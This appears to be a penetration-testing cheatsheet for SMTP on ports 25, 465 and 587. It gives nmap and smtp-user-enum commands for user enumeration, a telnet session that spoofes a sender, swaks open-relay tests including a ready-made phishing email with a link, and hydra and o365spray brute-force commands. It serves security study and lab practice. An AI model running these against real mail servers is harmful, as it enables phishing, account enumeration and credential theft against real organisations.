# SMTP (25 / 465 / 587)

[[09 - Service Cheatsheets/00 - README|Folder index]]

## Attacker Mindset

Mail server. Look for **open relay** (can send mail as anyone — instant phishing infrastructure from a trusted IP) and **user enumeration** via VRFY/EXPN/RCPT TO. 25 = plaintext, 465 = implicit TLS, 587 = STARTTLS submission. If you see 25 + 587 + 993/995 together, you're looking at a full mail server (likely Exchange or Postfix). **Common attack vectors:** open relay abuse, VRFY/EXPN/RCPT user enumeration, credential brute force, spoofed email delivery.

## Enumerate

```bash
nmap -sV -sC -p 25,465,587 $IP
nmap --script smtp-* -p 25 $IP
```

## User enumeration

```bash
smtp-user-enum -M VRFY -U users.txt -t $IP
smtp-user-enum -M RCPT -U users.txt -t $IP
smtp-user-enum -M EXPN -U users.txt -t $IP
```

## Manual interaction

```bash
telnet $IP 25
HELO test.com
VRFY user
MAIL FROM: <attacker@evil.com>
RCPT TO: <victim@target.com>
DATA
Subject: Test
Test message
.
QUIT
```

## Open relay test

```bash
swaks --from attacker@evil.com --to victim@target.com --server $IP
swaks --from notifications@inlanefreight.com --to employees@inlanefreight.com --header 'Subject: Company Notification' --body 'Hi All, we want to hear from you! Please complete the following survey. http://mycustomphishinglink.com/' --server 10.10.11.213

nmap -p25 -Pn --script smtp-open-relay 10.10.11.213
# If it sends without auth → open relay
```

## Brute-force

```bash
hydra -l user -P passwords.txt smtp://$IP -V

python3 o365spray.py --enum -U users.txt --domain msplaintext.xyz
```
